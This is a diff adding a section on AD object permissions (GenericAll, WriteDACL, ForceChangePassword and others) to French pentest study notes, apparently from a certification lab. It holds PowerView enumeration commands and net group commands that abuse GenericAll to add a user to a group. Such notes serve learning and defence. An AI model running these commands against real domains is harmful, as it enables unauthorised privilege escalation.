@@ -233,3 +233,44 @@ nslookup.exe web04.corp.com
 
 > Les comptes de service ont généralement plus de privilèges qu'un user standard. Un SPN de type `HTTP/web04.corp.com` indique un serveur web — vecteur pour Kerberoasting (voir modules suivants).
 
+### Permissions sur les objets AD (ACL/ACE)
+
+Chaque objet AD a une ACL (Access Control List) composée d'ACEs (Access Control Entries). Permissions intéressantes pour un attaquant :
+
+| Permission | Effet |
+|---|---|
+| `GenericAll` | Contrôle total sur l'objet |
+| `GenericWrite` | Modifier certains attributs |
+| `WriteOwner` | Changer le propriétaire |
+| `WriteDACL` | Modifier les ACEs |
+| `AllExtendedRights` | Reset de mot de passe, etc. |
+| `ForceChangePassword` | Forcer le changement de mdp |
+| `Self` | S'ajouter soi-même (ex: à un groupe) |
+
+**Énumérer les ACEs d'un objet**
+
+```powershell
+Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
+```
+
+**Convertir un SID en nom lisible**
+
+```powershell
+Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
+
+# Convertir plusieurs SIDs d'un coup
+"S-1-5-...-512","S-1-5-...-1104" | Convert-SidToName
+```
+
+**Exploiter un GenericAll sur un groupe**
+
+```cmd
+:: Ajouter un utilisateur au groupe
+net group "Management Department" stephanie /add /domain
+
+:: Retirer l'utilisateur (cleanup)
+net group "Management Department" stephanie /del /domain
+```
+
+> Un user standard avec `GenericAll` sur un objet est une misconfiguration — permet d'ajouter des membres à des groupes, de reset des mots de passe, etc. Toujours nettoyer après exploitation.
+
